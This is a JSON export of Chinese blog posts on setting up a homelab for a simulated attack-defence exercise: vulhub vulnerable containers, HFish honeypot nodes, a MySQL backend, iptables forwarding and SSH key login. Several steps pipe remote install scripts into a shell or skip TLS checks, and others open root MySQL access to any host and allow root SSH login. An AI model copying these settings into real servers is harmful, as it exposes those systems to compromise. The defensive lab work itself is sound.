1btn.setShortcut(&quot;Meta+a&quot;)","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"PyQt","slug":"PyQt","permalink":"https://gryffinbit.top/tags/PyQt/"}],"author":"Gryffinbit"},{"title":"miniforge创建虚拟环境","slug":"miniforge创建虚拟环境","date":"2022-03-31T18:56:29.000Z","updated":"2024-11-12T06:59:26.000Z","comments":true,"path":"2022/04/01/miniforge创建虚拟环境/","permalink":"https://gryffinbit.top/2022/04/01/miniforge%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/","excerpt":"","text":"前言由于目前Anaconda没有支持arm架构的版本，在M1芯片Mac上安装的Anaconda是非常不稳定的，而且仅支持最高3.8版本的Python。而官网原生支持运行在arm架构上的Python版本为3.9.1，所以综合来讲我们只能寻找一种替代方案，那就是miniforge。 安装miniforge 下载 在GitHub项目里，找到release的安装脚本，选择macOS-arm64.sh的脚本下载。 项目地址 安装 123cd Downloadbash Miniforge3-MacOSX-arm64.shsource ~/.zshrc 检查是否安装成功 1conda --version 为项目创建虚拟环境 miniforge创建的虚拟环境路径是 &#x2F;Users&#x2F;[用户名]&#x2F;miniforge3&#x2F;envs 123cd [项目文件夹路径]conda create -n [为虚拟环境起的名字] python==3.9conda activate [为虚拟环境起的名字] 默认环境是base，使用某一个虚拟环境时，前面的base会变成当前使用的环境名称 mini forge的虚拟环境可以隔离，为该虚拟环境下载需要的安装包时，建议使用conda install 下载 如果不能安装的话，也可以选用pip install ，效果差不多。 这篇文章有详细介绍两种安装方式的差别 https://www.cnblogs.com/Li-JT/p/14024034.html pyqt5 项目部署1234conda activate TQHoneypip3 install pyqt5pip3 install pyqt5-toolspip3 install sip 更换源的话会更快 1pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyqt5-tools 清华：https://pypi.tuna.tsinghua.edu.cn/simple阿里云：http://mirrors.aliyun.com/pypi/simple/中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/华中理工大学：http://pypi.hustunique.com/山东理工大学：http://pypi.sdutlinux.org/豆瓣：http://pypi.douban.com/simple/note：新版ubuntu要求使用https源，要注意。 配置pycharmPreference选择解释器路径。（可以直接pycharm打开文件夹，选择刚刚配置好环境的那个文件夹，就会自动导入解释器的路径了） 配置GitHub项目同步上传至GitHub 通过认证 首先在本地生成key 1ssh-keygen 打开GitHub。setting里面添加ssh 名字随便取， 将刚刚生成的～/.ssh/id_rsa.pub粘贴进去即可。 参考文章pycharm里面github登录总是显示missing access token git上传报错 LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443 报错","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"conda","slug":"conda","permalink":"https://gryffinbit.top/tags/conda/"}],"author":"Gryffinbit"},{"title":"ubuntu安装配置mysql（Hfish数据库）","slug":"ubuntu安装配置mysql","date":"2022-03-26T23:18:07.000Z","updated":"2024-11-12T06:59:10.000Z","comments":true,"path":"2022/03/27/ubuntu安装配置mysql/","permalink":"https://gryffinbit.top/2022/03/27/ubuntu%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEmysql/","excerpt":"","text":"ubuntu云服务的其他详细配置见另一个blog环境配置 ubuntu安装配置mysql安装mysql 安装服务 12345678910# 安装服务sudo apt update apt install mysql-client-core-8.0 # version 8.0.28-0ubuntu0.20.04.3 sudo apt-get install mysql-server# 开启服务service mysql start# 查询是否开启成功sudo netstat -tap | grep mysql 1sudo apt update 1apt install mysql-client-core-8.0 # version 8.0.28-0ubuntu0.20.04.3 1sudo apt-get install mysql-server 开启服务 1service mysql start 查询是否开启成功 1sudo netstat -tap | grep mysql 配置mysql 登陆 1mysql -u root 修改密码 1sudo cat /etc/mysql/debian.cnf 用显示的用户密码登陆 1ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;[输入新密码]&#x27;; 创建蜜罐的Hfish数据库 把创建数据库的mysql脚本上传到云对象存储 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263-- ------------------------------ Table structure for `hfish_info`-- ----------------------------DROP TABLE IF EXISTS `hfish_info`;CREATE TABLE `hfish_info` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `project_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `country` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `region` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `city` varchar(10) NOT NULL, `info` text NOT NULL, `create_time` datetime NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_colony`-- ----------------------------DROP TABLE IF EXISTS `hfish_colony`;CREATE TABLE `hfish_colony` ( `id` int(11) NOT NULL AUTO_INCREMENT, `agent_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent_ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `web_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `deep_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ssh_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `redis_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mysql_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `http_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `telnet_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ftp_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mem_cache_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `plug_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `last_update_time` datetime NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `un_agent` (`agent_name`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_setting`-- ----------------------------DROP TABLE IF EXISTS `hfish_setting`;CREATE TABLE `hfish_setting` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `info` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `update_time` datetime NOT NULL, `status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `setting_name` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `setting_dis` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, PRIMARY KEY (`id`), UNIQUE KEY `index_key` (`type`)) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of `hfish_setting`-- ----------------------------BEGIN;INSERT INTO `hfish_setting` VALUES (&#x27;1&#x27;, &#x27;mail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;E-mail 群发&#x27;, &#x27;群发邮件SMTP服务器配置&#x27;), (&#x27;2&#x27;, &#x27;alertMail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 18:58:12&#x27;, &#x27;0&#x27;, &#x27;E-mail 通知&#x27;, &#x27;蜜罐告警会通过邮件告知信息&#x27;), (&#x27;3&#x27;, &#x27;webHook&#x27;, &#x27;&#x27;, &#x27;2019-09-03 11:49:00&#x27;, &#x27;0&#x27;, &#x27;WebHook 通知&#x27;, &#x27;蜜罐告警会请求指定API告知信息&#x27;), (&#x27;4&#x27;, &#x27;whiteIp&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;IP 白名单&#x27;, &#x27;蜜罐上钩会过滤掉白名单IP&#x27;);COMMIT;SET FOREIGN_KEY_CHECKS = 1; 云服务器下载sql脚本 1curl -o hfish.sql &quot;https://appendix-1310394682.cos.ap-beijing.myqcloud.com/script/hfish.sql&quot; 创建数据库 1create database hfish default charset=utf8; 使用该数据库 1use hfish 导入mysql 1source /home/ubuntu/hfish.sql 查看数据库内容 12show tables; #查看表desc [表名]; # 查看表具体信息，列 允许外网访问 修改云服务器上mysql配置文件 12cd /etc/mysqlvim mysql.cnf 添加这一行 1234[mysqld]bind-address = 0.0.0.0 # 要空一行 检查监听端口 1netstat -nutlp | grep mysql 设置mysql的权限 进入mysql： 1mysql -uroot -p 输入密码。 选择mysql数据库： 1use mysql; 增加允许远程访问的用户或者允许现有用户的远程访问。 给root授予在任意主机（%）访问任意数据库的所有权限。 1update user set host=&#x27;%&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;; 退出mysql： 1exit 重启数据库： 1sudo service mysql restart 连接成功","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://gryffinbit.top/tags/mysql/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"}],"author":"Gryffinbit"},{"title":"模拟攻防演练中篇，蓝方靶场部署","slug":"模拟攻防演练中篇，蓝方靶场部署","date":"2022-03-24T13:45:39.000Z","updated":"2024-11-12T07:00:09.000Z","comments":true,"path":"2022/03/24/模拟攻防演练中篇，蓝方靶场部署/","permalink":"https://gryffinbit.top/2022/03/24/%E6%A8%A1%E6%8B%9F%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%AF%87%EF%BC%8C%E8%93%9D%E6%96%B9%E9%9D%B6%E5%9C%BA%E9%83%A8%E7%BD%B2/","excerpt":"","text":"前言记录一次入侵检测&#x2F;应急响应的实战攻击。 实战思路： 在云服务器（Ubuntu Server 20.04 LTS 64bit）上装docker，docker靶场选择vulhub，红方攻击靶机，蓝方在docker内的靶场环境里进行溯源和入侵检测等一系列防守工作。期间蓝队防守，会用蜜罐来迷惑和检测攻击。蜜罐选用Hfish，在本地的物理机搭建，作为管理端，为docker靶机分配子节点，以此来对docker靶机进行蜜罐部署。 感谢 @Gryffinrab 的红方攻击友情出演 Hfish靶场搭建参考以前的blog。上次的Blog传送门Hfish蜜罐部署 ubuntu 基本配置设置SSH连接时长 打开云服务器ssh配置文件： 1vim /etc/ssh/sshd_config 加入如下两个参数保存就可以： 1234TCPKeepAlive yes # 保持TCP连接ClientAliveInterval 600 ClientAliveCountMax 10 重启ssh服务 1service sshd restart 在客户端本地配置 在~./ssh/config里添加 1234# 断开时重试连接的次数 ServerAliveCountMax 5 # 每隔10秒自动发送一个空的请求以保持连接 ServerAliveInterval 10 换源我这里阿里源比腾讯自己的源要快一些 1sudo vim /etc/apt/sources.list 把本来的腾讯源注释掉，换成阿里源 12345678910111213141516171819deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse focal 更新源 1sudo apt-get update 更新软件 1sudo apt-get upgrade 装oh-my-zsh安装git 1sudo apt install git -y 查看系统当前shell 1echo $SHELL 查看系统自带哪些shell 1cat /etc/shells 安装zsh 1sudo apt install zsh -y 安装之后 使用 cat /etc/shells 查看系统的shell有 /usr/bin/zsh说明安装成功。 设置zsh为默认shell 1chsh -s /bin/zsh 然后重启 1sudo reboot 安装oh-my-zsh 1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; 配置文件 1vi ~/.zshrc 修改主题 修改这一行ZSH_THEME=&quot;robbyrussell&quot;将主题修改为自己喜欢的 重新加载配置文件 1source ~/.zshrc 下载插件 自动提示 1git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions 语法高亮 1sudo apt install zsh-syntax-highlighting 1echo &quot;source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ~/.zshrc 修改配置文件，生效插件 1vim ~/.zshrc 找到插件位置，添加刚刚的插件 1source ~/.zshrc PS：如果重新打开终端看不到自动提示，可能是终端的字体颜色太淡了，可以通过👇配置把字体改亮一些： 1cd ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions 修改自动提示相关的配置文件：ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=&#39;fg=10&#39; 12vi zsh-autosuggestions.zshsource ~/.zshrc Ubuntu 快速开启 TCP BBR 实现高效单边加速Linux Kernel 内核升级到 4.9 及以上版本可以实现 BBR 加速，由于Ubuntu 18.04 默认的内核就是 4.15版本的内核。 由于Ubuntu 20.04 默认的内核就是 5.4 版本的内核，并已经默认编译了 TCP BBR 模块，所以可以直接通过参数开启。新的 TCP 拥塞控制算法 BBR (Bottleneck Bandwidth and RTT) 可以让服务器的带宽尽量跑慢。并且尽量不要有排队的情况，让网络服务更佳稳定和高效。 修改系统变量： 12echo net.core.default_qdisc=fq &gt;&gt; /etc/sysctl.confecho net.ipv4.tcp_congestion_control=bbr &gt;&gt; /etc/sysctl.conf 保存生效 1sysctl -p 执行 1sysctl net.ipv4.tcp_available_congestion_control 如果结果是这样 12sysctl net.ipv4.tcp_available_congestion_controlnet.ipv4.tcp_available_congestion_control = bbr cubic reno 就开启了。执行 lsmod | grep bbr ，以检测 BBR 是否开启。 vulhub靶场搭建vulhub官方安装 安装docker-compose1234567891011# 安装pipcurl -s https://bootstrap.pypa.io/get-pip.py | python3# 安装最新版dockercurl -s https://get.docker.com/ | sh# 启动docker服务systemctl start docker# 安装composepip install docker-compose 靶场的使用12345678910111213# 下载项目wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zipcd vulhub-master# 进入某一个漏洞/环境的目录cd thinkphp/in-sqlubjection# 自动化编译环境sudo docker-compose build# 启动整个环境sudo docker-compose up -d 查看readme.md，根据指示访问链接 1http://your-ip/index.php?ids[]=1&amp;ids[]=2 环境运行成功 为靶场部署蜜罐 思路：在ubuntu服务器部署蜜罐管理端，为docker靶场部署节点蜜罐 端口转发 思路：hfish蜜罐的管理端部署在云服务器中，需要使用内网IP访问 https://10.0.20.15:4433/web，但由于在云服务器内访问网页不方便，所以想到用端口转发，将内网的端口映射到公网上，这样就可以通过外网去访问了。 打开防火墙端口 1sudo ufw allow [端口]/tcp 重装防火墙，使之生效 1sudo ufw reload ubuntu部署蜜罐 root用户 1bash &lt;(curl -sS -L https://hfish.io/webinstall.sh) iptables NAT功能 由于linux主机出于安全考虑，系统参数&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward默认为0，所以是禁止NAT功能的 修改配置文件 1vim /etc/sysctl.conf 找到以下两行，打开注释，并把0改成1 12net.ipv4.ip_forward = 1net.ipv6.ip_forward = 1 使配置生效 1sudo sysctl -p 转发配置 1iptables -t nat -A PREROUTING -p tcp -d [公网ip] --dport [端口4433] -j DNAT --to-destination [内网IP：端口] 1iptables -t nat -A POSTROUTING -p tcp -s [公网ip] --sport [端口4433] -j SNAT --to-source [公网ip] 使配置永久生效 1sudo apt-get install iptables-persistent 12sudo netfilter-persistent savesudo netfilter-persistent reload 删除配置 列出规则，包括序号 1iptables -t nat -L -n --line-numbers 根据序号删除，这里假如它的序号是1 1iptables -t nat -D PREROUTING 1 特别重要的一点！就是云服务的防火墙会有拦截！ 进入云服务器控制台，添加端口 最后就可以成功在物理机上去访问云服务器里面部署的蜜罐了（内网https://10.0.20.15:4433/web 公网 https://81.x.x.x:4433/web) 蜜罐服务开启的端口，腾讯云也要打开！ 在云服务器内，给docker部署节点蜜罐使docker可以访问物理机 1ip -4 route list match 0/0 | awk &#x27;&#123;print $3 &quot; host.docker.internal&quot;&#125;&#x27; &gt;&gt; /etc/hosts 这里有个坑，就是Hfish蜜罐给出的节点 这里有个坑，就是Hfish蜜罐给出的节点管理是4434，但是不知道为什么不能访问，于是就把配置里它的4434改成了别的端口，就可以顺利访问了。 hfish的安装路径 12/usr/share/hfish/opt/hfish 修改hfish的端口 12cd /usr/share/hfishvim config.toml 同时要在云服务器的防火墙管理处，添加4435端口 重启hfish蜜罐服务 123ps -aux|grep hfish # 找到hfishkill [PID] # 杀掉进程 hfish-server/opt/hfish/hfish-server -d /opt/hfish/2.9.1 # 开启进程 进入docker的bash 1docker exec -it [docker的ID] bash 测试是否可以访问管理端的4435端口 1curl -k https://10.0.20.15:4435 返回了404notfound，所以访问成功 在云服务上搭建的蜜罐管理端，生成节点 管理节点，填云服务器的内网IP（可以就是蜜罐管理端部署的那个IP） 在docker里安装节点 1sh -c &quot;$(curl -k https://10.0.20.15:4435/tmp/bGnhE0WjjNo9.sh)&quot; 环境测试 用物理机上装的kali，扫一下云服务器上的docker靶场。预期效果，应该是云服务器上的蜜罐管理端会告警此次扫描 外部可以访问到docker靶场，http://81.70.247.200/index.php?ids[]=1&amp;ids[]=2，并且开启了80端口。尝试蜜罐开启80端口的蜜罐服务，看会有什么变化。 要把docker里面的80端口映射到公网，并且公网的蜜罐服务，要关闭80端口的服务 配置端口映射 Docker IP 是172.22.0.3。宿主机IP 是10.0.15.20 映射端口，使172.22.0.3的蜜罐服务端口能够通过公网IP访问到。 docker-compose配置文件映射，使得物理机可以访问该端口，再映射到外网 蜜罐管理端开启Aruba无线AP蜜罐 9101，docker内访问该蜜罐服务，可以顺利访问 1curl -k https://172.22.0.3:9101 docker-compose配置端口映射 docker映射到宿主机 12cd /home/ubuntu/vulhub-master/thinkphp/in-sqlinjection/ # 找到docker靶场的路径vim docker-compose.yml 重启服务，查看端口是否映射成功 123docker-compose downdocker-compose up -ddocker container ls -l docker的IP发生了变化，所以节点需要重新部署 在蜜罐管理端，生成新的脚本，在docker的bash里面运行。子节点部署成功，管理端里开启9101的服务 接下来用https://公网IP:9101 https:// 服务器内网IP:9101 https://dockerIP:9101 都可以正常访问了 后记之前为了不那么难，所以docker的服务都映射出去了，后面可以再来一个docker，不公开映射出来这些端口，需要攻击方拿下云服务器的bash，在利用云服务器，去访问docker，找flag，进而进行内网渗透。 参考文章https://blog.csdn.net/qm5132/article/details/83039405 内网渗透中的端口转发 docker的网络模式：docker访问宿主机 docker访问宿主机 蜜罐的一些参考链接 https://blue.y1ng.org/0x7_honeypots/ https://www.freebuf.com/sectool/190840.html%C2%A0T-Pot https://www.pa55w0rd.online/hfish-web/ https://www.freebuf.com/vuls/289282.html https://github.com/hacklcx/HFish https://hfish.io/#/2-2-linux https://jocatw.github.io/2020/11/08/Hfish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/ https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md#honeypots https://sosly.me/index.php/2018/03/22/jymiguan7/ http://pirogue.org/2019/01/15/opencanary_2/ https://github.com/p1r06u3/opencanary_web https://zhuanlan.zhihu.com/p/110886405","categories":[{"name":"攻防模拟","slug":"攻防模拟","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/"},{"name":"蓝队","slug":"攻防模拟/蓝队","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/%E8%93%9D%E9%98%9F/"}],"tags":[{"name":"云服务器","slug":"云服务器","permalink":"https://gryffinbit.top/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"应急响应","slug":"应急响应","permalink":"https://gryffinbit.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"入侵排查","slug":"入侵排查","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/tags/Linux/"}],"author":"Gryffinbit"},{"title":"内网渗透端口转发","slug":"内网渗透端口转发","date":"2022-03-23T19:04:18.000Z","updated":"2024-11-12T07:00:08.000Z","comments":true,"path":"2022/03/24/内网渗透端口转发/","permalink":"https://gryffinbit.top/2022/03/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","excerpt":"","text":"完整版 见另一篇blog云服务器部署靶场 端口转发 思路：hfish蜜罐的管理端部署在云服务器中，需要使用内网IP访问 https://10.0.20.15:4433/web，但由于在云服务器内访问网页不方便，所以想到用端口转发，将内网的端口映射到公网上，这样就可以通过外网去访问了。 打开防火墙端口 1sudo ufw allow [端口]/tcp 重装防火墙，使之生效 1sudo ufw reload iptables NAT功能 由于linux主机出于安全考虑，系统参数&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward默认为0，所以是禁止NAT功能的 修改配置文件 找到以下两行，打开注释，并把0改成1 12net.ipv4.ip_forward = 1net.ipv6.ip_forward = 1 使配置生效 1sudo sysctl -p 转发配置 1iptables -t nat -A PREROUTING -p tcp -d [公网ip] --dport [端口] -j DNAT --to-destination [内网IP：端口] 1iptables -t nat -A POSTROUTING -p tcp -s [公网ip] --sport [端口] -j SNAT --to-source [公网ip] 使配置永久生效 1netfilter-persistent save 特别重要的一点！就是云服务的防火墙会有拦截！ 进入云服务器控制台，添加端口 最后就可以成功在物理机上去访问云服务器里面部署的蜜罐了（内网https://10.0.20.15:4433/web 公网 https://81.x.x.x:4433/web)","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"内网渗透","slug":"渗透测试/内网渗透","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://gryffinbit.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"author":"Gryffinbit"},{"title":"关于ssh密钥认证一个好玩的事情","slug":"关于ssh密钥认证一个好玩的事情","date":"2022-03-21T22:48:45.000Z","updated":"2024-11-12T07:00:15.000Z","comments":true,"path":"2022/03/22/关于ssh密钥认证一个好玩的事情/","permalink":"https://gryffinbit.top/2022/03/22/%E5%85%B3%E4%BA%8Essh%E5%AF%86%E9%92%A5%E8%AE%A4%E8%AF%81%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%BA%8B%E6%83%85/","excerpt":"","text":"前言事情是这样的，我搞了一个腾讯的云服务器，ssh远程登录的时候采用pubkeyAuthentication。开始的系统是debian11，后来换成了ubuntu。ssh远程登录的时候习惯性的root登录，结果ubuntu的时候，就会报错Permission denied (publickey). 我很迷惑，ssh文件夹给的700权限，key给的400权限，ubuntu配置文件/etc/ssh/sshd_config也改了认证方式，为什么会认证不过。但是如果用密码认证，root登录就可以输入密码正常登录。 最后排查，发现了好玩的事情。 腾讯云的ubuntu登录，默认是用ubuntu登录，而不是root，如果是用root登录就会失败 以下是腾讯云SSH认证的具体流程 SSH密钥认证步骤 进入到腾讯云的控制台，创建密钥，并绑定到服务器 创建成功后，会自动下载私钥，这个私钥只有一次下载机会，务必小心保存。下载好后放进ssh文件夹。（在macOS系统上路径为 &#x2F;Users&#x2F;username&#x2F;.ssh） 将刚刚下载的密钥文件赋予400权限 1chmod 400 /Users/[用户名]/.ssh/[私钥] ps: .ssh文件夹可以赋予700、755、600权限 通过控制台进入到服务器bash，修改配置文件 ubuntu默认密码是随机的， 开始可以先自己配置一个密码 1sudo passwd 进入root，修改配置文件 12su rootvim /etc/ssh/sshd_config 找到PasswordAuthentication 打开注释（删除#），并把后面改成no 找到PubkeyAuthentication 打开注释（删除#），并把后面改成yes 找到PermitRootLogin 打开注释（删除#），并把后面改成yes 报错并退出 服务器重启ssh服务 1service sshd restart 物理机远程登录 1ssh -i /Users/[username]/.ssh/[密钥] ubuntu@[服务器公网IP] 注意！就是这里！登录的用户名是ubuntu！","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"云服务器","slug":"云服务器","permalink":"https://gryffinbit.top/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"author":"Gryffinbit"},{"title":"模拟攻防演练上篇，蓝方靶场部署","slug":"模拟攻防演练上篇，蓝方靶场部署","date":"2022-03-12T13:44:31.000Z","updated":"2024-11-12T07:00:10.000Z","comments":true,"path":"2022/03/12/模拟攻防演练上篇，蓝方靶场部署/","permalink":"https://gryffinbit.top/2022/03/12/%E6%A8%A1%E6%8B%9F%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8A%E7%AF%87%EF%BC%8C%E8%93%9D%E6%96%B9%E9%9D%B6%E5%9C%BA%E9%83%A8%E7%BD%B2/","excerpt":"","text":"模拟攻防演练上篇，蓝方靶场部署 以下这篇blog只是记录了当时做这些的一个思路，以及搭建的过程，但最终实现的时候有一些难以解决的问题。因为那些docker靶场不支持ARM架构，所以后来我又采用了另外一种方式，详情见Blog 模拟攻防演练中篇 前言记录一次入侵检测&#x2F;应急响应的实战攻击。 实战思路：物理机用docker搭漏洞靶场，让男朋友来做红方攻击，他来打docker漏洞靶场，我在docker里面做蓝方的防守以及入侵检测&#x2F;应急响应。 期间我的蓝队防守，会用蜜罐来迷惑和检测攻击。 感谢 @Gryffinrab 的友情出演 靶场搭建vulhub靶场搭建初步 前提已经有docker的安装 没有docker环境的参考另外一篇blog sql靶场搭建（内置docker的安装步骤） 1pip3 install docker-compose 下载vulhub Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。官网地址：https://vulhub.org/ 1git clone https://github.com/phith0n/vulhub.git 指定到vulhub的路径 1cd vulhub 进入vulhub目录，可以看到很多测试环境目录，每个环境目录下都有相应的说明文件 12lscd struts2 进入某一漏洞的环境 12lscd s2-007 修改docker-compose.yml进入漏洞所在文件夹，修改docker-compose.yml 1vim docker-compose.yml 增加一行 1privileged: true 因为后面启动docker的时候，需要用到systemctl命令，要用这一行来赋予这个docker高权限 自动化编译环境 1docker-compose build 启动整个环境 1docker-compose up -d 为靶场部署docker 可能是由于vulhub靶场的原因，docker的部署不是很顺利，不支持systemctl，service也会报错，所以这里暂时没有找到好的方法，只提供一种思路。 可参考之前蜜罐部署的blog [hfish蜜罐部署docker]（https://gryffinbit.top/2022/02/24/hfish%E8%9C%9C%E7%BD%90%E9%83%A8%E7%BD%B2/） 进入docker靶场的bash 为该docker靶场，安装docker https://yeasy.gitbook.io/docker_practice/install/debian 查看靶场系统信息 1cat /etc/issue 发现是Debain，根据docker的官方下载，安装docker 安装sudo命令 su //进入root权限 apt-get update apt-get install sudo 1234567 ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/202203200011273.png)* 把root添加到sudo组 ```shell adduser root sudo 卸载旧版本 旧版本的 Docker 称为 docker 或者 docker-engine，使用以下命令卸载旧版本： 123sudo apt-get remove dockersudo apt-get remove docker-enginesudo apt-get remove docker.io 使用 APT 安装 由于 apt 源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书。 1234567sudo apt-get updatesudo apt-get install apt-transport-httpssudo apt-get install ca-certificatessudo apt-get install curlsudo apt-get install gnupgsudo apt-get install lsb-release debian更换源 为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥。 12# 阿里源curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg 向 sources.list 中添加 Docker 软件源： 在一些基于 Debian 的 Linux 发行版中 $(lsb_release -cs) 可能不会返回 Debian 的版本代号，例如 Kail Linux、 BunsenLabs Linux。在这些发行版中我们需要将下面命令中的 $(lsb_release -cs) 替换为 https://mirrors.aliyun.com/docker-ce/linux/debian/dists/ 中支持的 Debian 版本代号，例如 buster。 1echo &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/debian buster stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null 以上命令会添加稳定版本的 Docker APT 源，如果需要测试版本的 Docker 请将 stable 改为 test。 安装docker 更新 apt 软件包缓存，并安装 docker-ce。 12345sudo apt-get updatesudo apt-get install docker-ce sudo apt-get install docker-ce-clisudo apt-get install containerd.io 使用脚本自动安装 12curl -fsSL get.docker.com -o get-docker.shsudo sh get-docker.sh --mirror Aliyun 执行这个命令后，脚本就会自动的将一切准备工作做好，并且把 Docker 的稳定(stable)版本安装在系统中。 启动docker 